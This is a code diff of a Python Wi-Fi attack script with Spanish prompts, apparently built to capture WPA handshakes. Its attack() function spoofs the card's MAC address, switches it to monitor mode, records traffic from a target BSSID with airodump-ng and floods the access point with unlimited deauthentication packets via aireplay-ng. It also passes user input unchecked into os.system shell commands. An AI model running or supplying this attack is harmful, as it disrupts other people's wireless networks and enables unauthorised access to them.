@@ -59,16 +59,23 @@ def scan():
 def attack(bssid,canal):
 	os.system("ifconfig")
 	wlan=input("Introduzca Wlan: ")
-	print("Procesando")
-	os.system('airmon-ng check kill')
-	os.system('ifconfig '+wlan+' down')
-	os.system('iwconfig wlan0 mode monitor')
-	os.system('macchanger -A '+wlan)
-	os.system('ifconfig '+wlan+' up')
-	time.sleep(2) 
-	os.system('airmon-ng start '+wlan)
-	if(wlan!='wlan0mon'): #falta condicion or
+	if(wlan=="wlan0mon" or wlan== "wlan1mon"):
+		wlan=wlan
+	else:
+		print("Procesando")
+		os.system('ifconfig '+wlan+' down')
+		time.sleep(1)
+		os.system('macchanger -A '+wlan)
+		time.sleep(1)
+		os.system('ifconfig '+wlan+' up') 
+		time.sleep(1)
+		os.system('airmon-ng check kill')
+		time.sleep(1)
 		os.system('airmon-ng start '+wlan)
+		time.sleep(1)
+		os.system('airmon-ng check '+wlan)
+		time.sleep(1)
+		wlan=(wlan+"mon")
 	print(wlan)
 	os.system('x-terminal-emulator -e airodump-ng -c '+canal+' -w file --bssid '+bssid+' '+wlan)
 	os.system('x-terminal-emulator -e aireplay-ng -0 0 -a'+bssid+' '+wlan+' --ignore-negative-one')
